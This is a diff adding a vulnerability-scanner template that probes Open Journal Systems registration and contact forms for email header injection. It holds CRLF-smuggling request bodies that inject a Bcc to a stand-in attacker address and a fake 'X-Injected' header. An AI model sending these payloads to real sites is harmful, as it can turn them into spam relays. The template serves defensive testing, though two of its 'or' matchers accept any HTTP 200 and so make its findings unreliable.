@@ -1,0 +1,99 @@
+id: ojs-email-header-injection
+
+info:
+  name: OJS Email Header Injection
+  author: OJS-Security-Scanner
+  severity: medium
+  description: |
+    Deteksi Email Header Injection pada form publik OJS.
+    Field yang dikirimkan ke sistem email (nama, subject, pesan) yang
+    tidak memfilter karakter CRLF (\r\n) dapat digunakan untuk
+    menginjeksi header email tambahan, menjadikan OJS sebagai relay spam.
+  tags:
+    - ojs
+    - email
+    - header-injection
+    - crlf
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+    cvss-score: 6.5
+    cwe-id: CWE-93
+
+http:
+  # Test 1: CRLF injection via registrasi user (field firstName)
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/user/register"
+
+    body: "firstName=Test%0d%0aBcc%3A+attacker%40evil.example.com&lastName=User&username=testuser9999&email=test9999%40example.com&password=TestPass123!&password2=TestPass123!&privacyConsent=1"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Bcc: attacker"
+          - "attacker@evil.example.com"
+        condition: or
+
+      - type: word
+        words:
+          - "Invalid"
+          - "error"
+          - "not allowed"
+          - "invalid character"
+        negative: true
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  # Test 2: CRLF injection via contact/support form
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/contact"
+
+    body: "contactName=Test%0d%0aBcc%3A+attacker%40evil.example.com&contactEmail=test%40example.com&contactSubject=Test+Subject&contactMessage=Test+Message"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Bcc: attacker"
+          - "attacker@evil.example.com"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 500
+
+  # Test 3: CRLF di subject field — check untuk refleksi di error response
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/contact"
+
+    body: "contactName=TestUser&contactEmail=test%40example.com&contactSubject=Test%0d%0aX-Injected%3A+pwned&contactMessage=Test"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "X-Injected: pwned"
+          - "X-Injected"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: injected_header
+        regex:
+          - "(?i)(X-Injected[^\\n]+|Bcc:[^\\n]+)"
